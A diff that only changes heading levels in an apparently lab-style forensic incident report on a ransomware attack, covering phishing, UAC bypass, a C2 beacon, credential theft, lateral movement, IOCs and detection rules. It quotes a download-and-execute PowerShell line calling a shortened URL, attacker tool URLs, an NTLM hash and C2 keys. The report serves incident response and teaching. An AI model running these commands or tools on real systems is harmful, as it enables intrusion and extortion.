@@ -14,7 +14,7 @@ Your firm has been contracted to perform a deep-dive forensic analysis to recons
 
 Please download the .zip file for more details of the information.
 
-# Incident Report: Silent Rimba Ransomware Attack
+## Incident Report: Silent Rimba Ransomware Attack
 
 **Organization:** Corp Bhd.  
 **Report Date:** December 18, 2025  
@@ -24,7 +24,7 @@ Please download the .zip file for more details of the information.
 
 ---
 
-## Table of Contents
+### Table of Contents
 
 1. [Executive Summary](#executive-summary)
 2. [Incident Overview](#incident-overview)
@@ -48,7 +48,7 @@ Please download the .zip file for more details of the information.
 
 ---
 
-## Executive Summary
+### Executive Summary
 
 **Incident ID:** IR-2025-1218-SILENTRIMBA  
 **Incident Severity:** Critical (P1)  
@@ -60,7 +60,7 @@ The threat actor, operating under the GitHub handle "TomatoTerbang", demonstrate
 
 Corp Bhd.'s Security Operations Center, in collaboration with the Digital Forensics and Incident Response (DFIR) team, has conducted a comprehensive investigation into the incident. This report documents the complete attack chain, from initial phishing email delivery through ransomware execution, and provides detailed technical analysis of all malicious tools and techniques employed by the threat actor.
 
-### Key Findings
+#### Key Findings
 
 | Aspect | Details |
 |--------|---------|
@@ -74,7 +74,7 @@ Corp Bhd.'s Security Operations Center, in collaboration with the Digital Forens
 | **Data Exfiltrated** | ~103 MB (confirmed via PCAP analysis) |
 | **Credentials Stolen** | Domain admin account `itdadmin` |
 
-### Attack Severity: **CRITICAL**
+#### Attack Severity: **CRITICAL**
 
 The threat actor demonstrated exceptionally advanced capabilities throughout this operation, showcasing a sophisticated understanding of Windows internals, enterprise security architectures, and detection evasion techniques. The attacker employed custom-developed tooling with a distinctive "brain-themed" naming convention (Neurotransmitter, Cerebrum, BrocaArea), suggesting an organized and potentially recurring threat actor.
 
@@ -96,9 +96,9 @@ The attack was executed with remarkable precision and speed—from initial email
 
 ---
 
-## Incident Overview
+### Incident Overview
 
-### Nature of Incident
+#### Nature of Incident
 
 This incident represents a targeted, multi-stage ransomware attack against Corp Bhd.'s enterprise infrastructure. The attack demonstrates characteristics of a well-planned operation with custom tooling, suggesting either a sophisticated threat actor or an organized criminal group with significant technical resources.
 
@@ -108,13 +108,13 @@ This incident represents a targeted, multi-stage ransomware attack against Corp 
 - **Decryption ID Provided:** AKLJNCKJN123KJANKJNC
 - **Ransom Communication:** The threat actor left ransom notes on affected systems with instructions for payment, though specific ransom demands are documented separately.
 
-### Discovery
+#### Discovery
 
 The incident was discovered during post-attack forensic analysis through examination of Sysmon event logs collected from the File Server (FS-CORP) and aggregated Splunk logs from across the network. Network traffic analysis via PCAP capture provided additional visibility into Command-and-Control communications and data exfiltration activities.
 
 Notably, the Splunk Forwarder service on FS-CORP was deliberately stopped by the attacker at 02:34:05, just 44 seconds before ransomware execution. This defense evasion technique successfully prevented real-time alerting during the most critical phase of the attack. The attack was only fully understood through comprehensive post-incident forensic investigation that reconstructed the complete attack chain from preserved evidence sources.
 
-### Attack Vector Summary
+#### Attack Vector Summary
 
 ```
 Phishing Email → Remote Template Injection → UAC Bypass → C2 Beacon
@@ -130,11 +130,11 @@ explorer.exe Deployed                              Lateral Movement → File Ser
 
 ---
 
-## Affected Systems and Assets
+### Affected Systems and Assets
 
 The unauthorized entity successfully gained control over three of four critical nodes within Corp Bhd.'s infrastructure. The attack progressed systematically from an initial workstation compromise, through domain controller takeover, to final ransomware deployment on the file server. Each compromised system served a specific purpose in the attack chain.
 
-### Compromised Systems
+#### Compromised Systems
 
 | Hostname | IP Address | Role | Compromise Level | Impact |
 |----------|------------|------|------------------|--------|
@@ -148,7 +148,7 @@ The unauthorized entity successfully gained control over three of four critical 
 
 **FS-CORP (File Server):** The file server was the ultimate target of the attack. After gaining domain admin access, the attacker moved laterally to this system, deliberately stopped the Splunk Forwarder to evade detection, and deployed the BrocaArea.ps1 ransomware module. All files on the D:\ drive—containing critical banking and financial documents—were encrypted with the .anon extension, rendering them inaccessible.
 
-### Unaffected Systems
+#### Unaffected Systems
 
 | Hostname | IP Address | Role | Status |
 |----------|------------|------|--------|
@@ -156,7 +156,7 @@ The unauthorized entity successfully gained control over three of four critical 
 
 **Critical Finding - BCKP-CORP Integrity Preserved:** Forensic analysis has confirmed that the backup server (BCKP-CORP) was NOT accessed or compromised during this incident. No network connections from the C2 server or compromised systems to BCKP-CORP were observed in the PCAP data. No suspicious process creation or file access events were logged on this system. This is a critical finding as it provides a viable path for data recovery without paying the ransom. The integrity of backups stored on BCKP-CORP should be verified against known-good checksums before initiating restoration procedures.
 
-### Affected User Accounts
+#### Affected User Accounts
 
 | Account | Domain | Status | Impact |
 |---------|--------|--------|--------|
@@ -169,15 +169,15 @@ The unauthorized entity successfully gained control over three of four critical 
 
 ---
 
-## Technical Analysis
+### Technical Analysis
 
 This section provides a comprehensive technical examination of the attack, documenting each phase from initial compromise through ransomware deployment. Evidence has been gathered from multiple sources including Sysmon event logs, Splunk aggregated data, network packet captures, and malware reverse engineering.
 
-### 4.1 Initial Access Vector
+#### 4.1 Initial Access Vector
 
 The attack began with a carefully crafted phishing email delivered to employee fakhri.zambri on the morning of December 18, 2025. This section documents the sophisticated multi-stage delivery mechanism that enabled the threat actor to bypass traditional email security controls and achieve code execution with elevated privileges.
 
-#### Phishing Email Delivery
+##### Phishing Email Delivery
 
 At 01:36:45 UTC+8, user fakhri.zambri received a phishing email containing two Microsoft Word document attachments. Analysis of the email artifacts and Sysmon logs reveals the following sequence of events:
 
@@ -187,7 +187,7 @@ At 01:36:45 UTC+8, user fakhri.zambri received a phishing email containing two M
 
 The timing and naming convention of these documents suggests careful social engineering. The "YEAR-END-FINANCIAL-REPORT" filename was likely chosen to exploit end-of-year business pressures and create urgency that would override the user's security awareness training.
 
-#### Remote Template Injection (T1221)
+##### Remote Template Injection (T1221)
 
 The YEAR-END-FINANCIAL-REPORT-2025.docx document employed a sophisticated technique known as Remote Template Injection. Unlike traditional macro-based attacks that require explicit user consent to enable macros, this technique exploits Word's legitimate template functionality to automatically fetch and execute a remote macro-enabled template without additional user interaction.
 
@@ -206,7 +206,7 @@ This technique is particularly insidious because:
 
 The template was hosted on GitHub under the repository "TomatoTerbang/fluffy-umbrella", abusing the platform's content delivery network for malware distribution.
 
-#### Reference.docm Macro Analysis
+##### Reference.docm Macro Analysis
 
 Once Word fetched the Reference.docm template from GitHub, the embedded VBA macro executed automatically via the `Document_Open()` event handler. Our analysis of the macro document revealed sophisticated obfuscation and payload delivery mechanisms designed to evade detection and analysis.
 
@@ -244,7 +244,7 @@ The complete macro execution proceeded through the following stages:
 
 7. **Secondary Stage Trigger:** The macro executes `iex(iwr -Uri 'https://tinyurl.com/4kaz75ds')` to download and execute the UAC bypass payload
 
-#### UAC Bypass via Event Viewer (T1548.002)
+##### UAC Bypass via Event Viewer (T1548.002)
 
 With the C2 beacon dropped to disk, the attacker faced a challenge: the beacon needed to run with elevated (administrator) privileges to perform credential theft and other privileged operations. However, User Account Control (UAC) would normally require explicit user consent for elevation.
 
@@ -290,11 +290,11 @@ This UAC bypass technique is particularly concerning because:
 
 ---
 
-### 4.2 Malware Analysis - explorer.exe (C2 Beacon)
+#### 4.2 Malware Analysis - explorer.exe (C2 Beacon)
 
 The primary malware component deployed in this attack is a sophisticated .NET-based Command-and-Control (C2) beacon. This section provides detailed reverse engineering analysis of the malware's capabilities, communication protocols, and anti-analysis features.
 
-#### Sample Information
+##### Sample Information
 
 The malware was deployed to `C:\Users\Public\explorer.exe`, deliberately mimicking the legitimate Windows Explorer process name to evade casual observation. Despite its simple filename, the sample is a complex, professionally developed implant with extensive capabilities.
 
@@ -322,7 +322,7 @@ The sample is protected with .NET Reactor, a commercial code protection tool tha
 - Anti-tampering protection
 - Possible time-bomb functionality (malware may refuse to execute outside certain date ranges)
 
-#### Execution Flow
+##### Execution Flow
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────┐
@@ -360,7 +360,7 @@ The sample is protected with .NET Reactor, a commercial code protection tool tha
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
-#### C2 Configuration
+##### C2 Configuration
 
 Network traffic analysis and malware reverse engineering revealed the C2 beacon's communication infrastructure and operational parameters.
 
@@ -391,14 +391,14 @@ Critically, SSL certificate validation is disabled in the implant. This allows t
 | `/file` | GET/POST | File download/upload operations |
 | `/keys` | GET | Retrieve encryption keys (for ransomware) |
 
-#### AES-256-CBC Encryption (Config Strings)
+##### AES-256-CBC Encryption (Config Strings)
 
 | Component | Base64 Value |
 |-----------|--------------|
 | **Key** | wWrx+62b7++4exaVvcwZRy3QNnd+KBGuEZcW46Ho6E4= |
 | **IV** | ERQOOQ4Cz2cyehEUrqfhLA== |
 
-#### Command System
+##### Command System
 
 The C2 beacon uses German-themed command names:
 
@@ -409,7 +409,7 @@ The C2 beacon uses German-themed command names:
 | **Holen** | "Fetch/Get" | Download file from C2 |
 | **Senden** | "Send" | Upload/exfiltrate file to C2 |
 
-#### Anti-Analysis Features
+##### Anti-Analysis Features
 
 1. **Obfuscated Function Names:** BonkersYonkersZap, TwiddleFadoodleSnap, FlibbityGibbityWham
 2. **Dead Code Injection:** Non-functional code paths for confusion
@@ -419,11 +419,11 @@ The C2 beacon uses German-themed command names:
 
 ---
 
-### 4.3 Attack Tools Analysis
+#### 4.3 Attack Tools Analysis
 
 The threat actor deployed a suite of attack tools with a distinctive naming convention based on brain anatomy and neuroscience terminology. This thematic consistency suggests an organized threat actor with established tooling and operational procedures. This section provides detailed analysis of each tool identified during the investigation.
 
-#### Tools Downloaded from GitHub (TomatoTerbang/BrainRil)
+##### Tools Downloaded from GitHub (TomatoTerbang/BrainRil)
 
 The attacker maintained two GitHub repositories for hosting attack infrastructure:
 - **TomatoTerbang/fluffy-umbrella:** Initial access components (macro template, C2 beacon payloads)
@@ -443,7 +443,7 @@ Notably, not all tools downloaded by the attacker were actually used. Both Brain
 - Cerebrum.ps1 (SMBExec via WMI) was sufficient for their needs
 - The staged tools may indicate standard operating procedures that include multiple options
 
-#### Brain-Themed Naming Convention
+##### Brain-Themed Naming Convention
 
 The consistent brain-themed naming convention provides insight into the threat actor's organizational approach and could serve as an attribution indicator:
 
@@ -460,7 +460,7 @@ This naming convention serves multiple purposes:
 - Demonstrates organizational sophistication and custom tool development
 - Could potentially link this attack to other incidents using the same naming scheme
 
-#### Credential Theft via Neurotransmitter.exe (Mimikatz)
+##### Credential Theft via Neurotransmitter.exe (Mimikatz)
 
 Mimikatz, renamed as "Neurotransmitter.exe" to evade signature detection, is a widely-known credential extraction tool capable of extracting plaintext passwords, NTLM hashes, and Kerberos tickets from Windows memory.
 
@@ -490,11 +490,11 @@ The theft of the `itdadmin` domain administrator hash was the pivotal moment in 
 
 ---
 
-### 4.4 Lateral Movement
+#### 4.4 Lateral Movement
 
 With credentials in hand, the attacker proceeded to expand their foothold across Corp Bhd.'s network. This section documents the lateral movement techniques employed to compromise the Domain Controller (AD-CORP) and ultimately the File Server (FS-CORP).
 
-#### Pass-the-Hash Attack (T1550.002)
+##### Pass-the-Hash Attack (T1550.002)
 
 Pass-the-Hash (PtH) is an attack technique that allows an attacker to authenticate to remote systems using the NTLM hash of a user's password, without needing to know the actual plaintext password. This technique exploits a fundamental weakness in NTLM authentication where the hash itself serves as proof of identity.
 
@@ -530,7 +530,7 @@ The attacker chose WMI-based execution over alternatives like PsExec for several
 - Fewer forensic artifacts are created compared to service-based execution
 - Many organizations do not adequately monitor WMI activity
 
-#### Lateral Movement to File Server
+##### Lateral Movement to File Server
 
 With Domain Controller access secured, the attacker's final objective became clear: the File Server (FS-CORP) containing critical business data.
 
@@ -551,11 +551,11 @@ The sequence of events on FS-CORP reveals careful operational security:
 
 ---
 
-### 4.5 Ransomware Execution
+#### 4.5 Ransomware Execution
 
 The final phase of the attack involved the deployment of custom ransomware to encrypt critical business data on the File Server. This section documents the ransomware's behavior and the defense evasion techniques employed to ensure successful execution.
 
-#### Defense Evasion - Splunk Forwarder Termination
+##### Defense Evasion - Splunk Forwarder Termination
 
 Before executing the ransomware, the attacker took deliberate steps to disable Corp Bhd.'s monitoring capabilities:
 
@@ -580,7 +580,7 @@ Notably, the attacker first attempted to execute the ransomware on the initial w
 
 The attacker then pivoted to targeting FS-CORP directly, where they ensured success by first disabling the monitoring service.
 
-#### Ransomware Deployment
+##### Ransomware Deployment
 
 With monitoring disabled, the attacker proceeded to download and execute the ransomware module:
 
@@ -596,7 +596,7 @@ Invoke-Broca
 
 The ransomware module, named `BrocaArea.ps1` after the brain region responsible for language (continuing the attacker's brain-themed naming convention), is a PowerShell-based file encryption tool. The primary function `Invoke-Broca` handles the encryption process.
 
-#### Encryption Behavior and Impact
+##### Encryption Behavior and Impact
 
 Based on forensic analysis, the ransomware exhibited the following behavior:
 
@@ -620,7 +620,7 @@ It is important to distinguish between the AES encryption key found in the C2 be
 
 ---
 
-## Attack Timeline
+### Attack Timeline
 
 This section provides a detailed chronological reconstruction of the attack, documenting each significant event from initial phishing email through ransomware execution. The timeline was reconstructed from Sysmon event logs, Splunk aggregated data, and network packet captures.
 
@@ -632,7 +632,7 @@ The attack can be divided into four distinct phases:
 
 The total attack duration from initial email access to ransomware execution was approximately **58 minutes**, demonstrating the attacker's efficiency and suggesting pre-planned procedures.
 
-### Detailed Timeline (December 18, 2025 - UTC+8)
+#### Detailed Timeline (December 18, 2025 - UTC+8)
 
 | Time | Host | Activity | MITRE |
 |------|------|----------|-------|
@@ -669,11 +669,11 @@ The total attack duration from initial email access to ransomware execution was 
 
 ---
 
-## Evidence Analysis
+### Evidence Analysis
 
 This section documents the evidence sources used to reconstruct the attack timeline and provides detailed analysis of key findings from each source. The combination of multiple evidence types enabled comprehensive visibility into the attack despite the attacker's defense evasion efforts.
 
-### Evidence Sources
+#### Evidence Sources
 
 | Source | Type | Location | Relevance |
 |--------|------|----------|-----------|
@@ -695,7 +695,7 @@ Packet capture on the network provided visibility into C2 communications that wo
 **Malware Samples:**
 Recovery and analysis of the C2 beacon (explorer.exe) and macro document (Reference.docm) provided deep technical insight into the attacker's capabilities, infrastructure, and operational procedures.
 
-### Network Traffic Analysis (PCAP)
+#### Network Traffic Analysis (PCAP)
 
 Analysis of the network packet capture revealed extensive command-and-control communications and significant data exfiltration:
 
@@ -718,7 +718,7 @@ Analysis of the network packet capture revealed extensive command-and-control co
 
 4. **Multiple Victim Connections:** Network analysis confirmed C2 connections from all three compromised hosts, verifying the successful lateral movement to AD-CORP and FS-CORP.
 
-### Splunk Query Examples
+#### Splunk Query Examples
 
 ```spl
 # Identify C2 beacon execution
@@ -740,9 +740,9 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 
 ---
 
-## Indicators of Compromise (IOCs)
+### Indicators of Compromise (IOCs)
 
-### File Hashes
+#### File Hashes
 
 | File Path | SHA256 | Purpose |
 |-----------|--------|---------|
@@ -756,7 +756,7 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 | `YEAR-END-FINANCIAL-REPORT-2025.docx` | `c3337074a81cb59e7db78087ded4b35dd89efddebd2bea8a8379748e5a58b1f3` | Weaponized document with Remote Template Injection |
 | `C:\Users\FAKHRI~1.ZAM\AppData\Local\Temp\xvzpox75.txt` | `e2dd5d13ef50e3232abce5b0786740c5d0d3c03414c479aee85ecb65f10887af` | Base64-encoded malware staging file |
 
-### Network Indicators
+#### Network Indicators
 
 | Type | Indicator | Description |
 |------|-----------|-------------|
@@ -765,7 +765,7 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 | Port | 7219 | Data Exfiltration |
 | Domain | corp.local | Target Domain |
 
-### URL Indicators
+#### URL Indicators
 
 | URL | Purpose |
 |-----|---------|
@@ -778,7 +778,7 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 | `github.com/TomatoTerbang/BrainRil/raw/refs/heads/main/Brainstemo` | PsExec |
 | `tinyurl.com/4kaz75ds` | UAC bypass payload |
 
-### File Path Indicators
+#### File Path Indicators
 
 | Path | Description |
 |------|-------------|
@@ -792,19 +792,19 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 | `C:\Windows\Temp\Salad.exe` | NetExec |
 | `C:\ProgramData\greenlight.dat` | Ransomware completion marker |
 
-### Credential Indicators
+#### Credential Indicators
 
 | Account | NTLM Hash | Status |
 |---------|-----------|--------|
 | itdadmin | 7cd2184b08d975c26b0368cb3ef4edee | **COMPROMISED** |
 
-### Mutex
+#### Mutex
 
 | Mutex | Purpose |
 |-------|---------|
 | 51F98B5B-ED19-F7D5-283E-B46984E8FA69A | C2 beacon single-instance check |
 
-### Encryption Configuration (C2 Config)
+#### Encryption Configuration (C2 Config)
 
 | Component | Base64 Value |
 |-----------|--------------|
@@ -814,9 +814,9 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 
 ---
 
-## MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-### Tactics and Techniques Used
+#### Tactics and Techniques Used
 
 | Tactic | Technique ID | Technique Name | Evidence |
 |--------|--------------|----------------|----------|
@@ -849,11 +849,11 @@ index=* EventCode=1 CommandLine="*stop*Splunk*"
 
 ---
 
-## Impact Assessment
+### Impact Assessment
 
 This section provides a comprehensive evaluation of the incident's impact across multiple dimensions: business operations, data integrity, system availability, and regulatory compliance.
 
-### Business Impact
+#### Business Impact
 
 The ransomware attack has had significant and multi-faceted impacts on Corp Bhd.'s operations:
 
@@ -880,7 +880,7 @@ Three of four critical systems suffered complete compromise:
 **Operational Impact - HIGH:**
 The file server being offline directly impacts business operations. Any workflows dependent on centralized file storage, document collaboration, or access to historical records are currently non-functional. The duration of this impact depends on successful backup restoration.
 
-### Systems Impact Summary
+#### Systems Impact Summary
 
 | System | Integrity | Availability | Confidentiality |
 |--------|-----------|--------------|-----------------|
@@ -889,7 +889,7 @@ The file server being offline directly impacts business operations. Any workflow
 | FS-CORP | Compromised | **Unavailable** | Data encrypted + exfiltrated |
 | BCKP-CORP | **Intact** | **Available** | **Secure** |
 
-### Data Impact
+#### Data Impact
 
 - **Encrypted Files:** All files on FS-CORP D:\ drive (.anon extension)
 - **Exfiltrated Data:** ~103 MB (verified via PCAP)
@@ -897,11 +897,11 @@ The file server being offline directly impacts business operations. Any workflow
 
 ---
 
-## Root Cause Analysis
+### Root Cause Analysis
 
 A thorough root cause analysis is essential to understanding not just what happened, but why the attack was successful and how similar incidents can be prevented in the future. This analysis examines the technical, procedural, and organizational factors that contributed to the incident.
 
-### Primary Causes
+#### Primary Causes
 
 The following factors were identified as primary contributors to the successful attack:
 
@@ -935,7 +935,7 @@ The lack of network segmentation allowed the compromised workstation to directly
 **Monitoring Gap (Contributing):**
 The attacker was able to stop the Splunk Forwarder service on FS-CORP without generating an alert. Security-critical services should be monitored for status changes, and service termination should trigger immediate investigation.
 
-### Attack Success Factors
+#### Attack Success Factors
 
 Beyond the root causes, several tactical factors contributed to the attack's success:
 
@@ -953,11 +953,11 @@ Beyond the root causes, several tactical factors contributed to the attack's suc
 
 ---
 
-## Response and Recovery
+### Response and Recovery
 
 This section outlines the immediate response actions required to contain the threat, eradicate the malware, and restore normal operations. Actions are prioritized based on their criticality to stopping ongoing damage and enabling recovery.
 
-### Immediate Containment Actions
+#### Immediate Containment Actions
 
 Containment is the first priority in incident response. The goal is to prevent the threat actor from causing additional damage while preserving evidence for forensic analysis.
 
@@ -992,7 +992,7 @@ Before any remediation activities, forensic images should be captured from all a
 - Insurance claims documentation
 - Post-incident lessons learned
 
-### Malware Removal
+#### Malware Removal
 
 Once containment is achieved, eradication efforts can begin. All identified malicious files must be removed from compromised systems. However, given the extent of the compromise, full system rebuilds are recommended rather than attempting to clean infected systems.
 
@@ -1018,7 +1018,7 @@ Once containment is achieved, eradication efforts can begin. All identified mali
 
 4. **File Hashes:** Use the SHA256 hashes provided in the IOC section to create detection rules and verify complete removal across all systems.
 
-### Credential Reset
+#### Credential Reset
 
 Given the confirmed credential theft and Domain Controller compromise, a comprehensive credential reset is essential. The attacker's access to `itdadmin` (domain administrator) means they potentially had full control over Active Directory, including the ability to create additional accounts or modify existing ones.
 
@@ -1041,7 +1041,7 @@ Given the confirmed credential theft and Domain Controller compromise, a compreh
 
 5. **Domain Users (7 days):** Implement a phased password reset for all domain users. This can be accomplished through a forced password change policy at next logon.
 
-### System Recovery
+#### System Recovery
 
 Given the depth of compromise on all three affected systems, complete rebuilds are strongly recommended over attempting to clean the existing installations. Cleaning a system that has been fully compromised by a sophisticated attacker leaves significant risk of undetected persistence mechanisms.
 
@@ -1065,7 +1065,7 @@ Given the criticality of Active Directory, engaging specialized AD security cons
 **FS-CORP Recovery:**
 The operating system partition should be reimaged from a clean baseline. The encrypted data on D:\ should be restored from backup stored on BCKP-CORP (confirmed uncompromised).
 
-### Data Restoration
+#### Data Restoration
 
 The successful recovery of encrypted data depends entirely on the availability and integrity of backups. The confirmation that BCKP-CORP was not compromised provides a viable restoration path.
 
@@ -1083,9 +1083,9 @@ The successful recovery of encrypted data depends entirely on the availability a
 
 ---
 
-## Recommendations and Remediation
+### Recommendations and Remediation
 
-### Immediate Actions (0-7 Days)
+#### Immediate Actions (0-7 Days)
 
 | Priority | Recommendation | Owner | Timeline |
 |----------|----------------|-------|----------|
@@ -1096,7 +1096,7 @@ The successful recovery of encrypted data depends entirely on the availability a
 | 5 | Conduct full malware scan with updated signatures | IT Operations | 48 hours |
 | 6 | Restore FS-CORP data from backup | IT Operations | 48-72 hours |
 
-### Short-Term Actions (1-4 Weeks)
+#### Short-Term Actions (1-4 Weeks)
 
 | Recommendation | Description |
 |----------------|-------------|
@@ -1106,7 +1106,7 @@ The successful recovery of encrypted data depends entirely on the availability a
 | Deploy enhanced email filtering | Implement sandboxing for attachments |
 | Implement network segmentation | Isolate workstations from critical servers |
 
-### Long-Term Actions (1-3 Months)
+#### Long-Term Actions (1-3 Months)
 
 | Recommendation | Description |
 |----------------|-------------|
@@ -1117,7 +1117,7 @@ The successful recovery of encrypted data depends entirely on the availability a
 | Implement immutable backups | Air-gapped or cloud-based backup solution |
 | Enable LSASS protection | Credential Guard, PPL |
 
-### Detection Rules
+#### Detection Rules
 
 ```yaml
 title: BrainRil Pass-the-Hash Tool Detection
@@ -1172,11 +1172,11 @@ detection:
 
 ---
 
-## Lessons Learned
+### Lessons Learned
 
 Every security incident, while damaging, provides valuable insights for improving an organization's security posture. This section analyzes the gaps exposed by this incident and provides actionable recommendations for improvement.
 
-### Gap Analysis
+#### Gap Analysis
 
 The following table summarizes the security gaps identified through this incident and provides specific recommendations for addressing each:
 
@@ -1220,7 +1220,7 @@ The presence of domain admin credentials on a standard workstation was a critica
 - Just-in-time access for privileged operations
 - Dedicated Privileged Access Workstations (PAWs) for administrative tasks
 
-### What Worked
+#### What Worked
 
 Despite the successful attack, several security measures provided value:
 
@@ -1230,7 +1230,7 @@ Despite the successful attack, several security measures provided value:
 - **BCKP-CORP Security:** The backup server remained uncompromised, providing a viable data recovery path
 - **Post-Incident Investigation:** The DFIR team successfully reconstructed the complete attack chain
 
-### What Failed
+#### What Failed
 
 The following security measures failed to prevent or detect the attack:
 
@@ -1243,9 +1243,9 @@ The following security measures failed to prevent or detect the attack:
 
 ---
 
-## Annexes
+### Annexes
 
-### Annex A: Attack Flow Diagram
+#### Annex A: Attack Flow Diagram
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
@@ -1304,14 +1304,14 @@ The following security measures failed to prevent or detect the attack:
     Data Exfil:      ~103 MB
 ```
 
-### Annex B: GitHub Repositories Used
+#### Annex B: GitHub Repositories Used
 
 | Repository | Purpose | Tools |
 |------------|---------|-------|
 | TomatoTerbang/fluffy-umbrella | Initial access | Reference.docm, rainingdroplets.txt, windyseasons.txt |
 | TomatoTerbang/BrainRil | Attack tools | Neurotransmitter, Cerebrum, Brainstemo, BrocaArea |
 
-### Annex C: Commands Executed via C2
+#### Annex C: Commands Executed via C2
 
 Total unique commands across all hosts: **56**
 
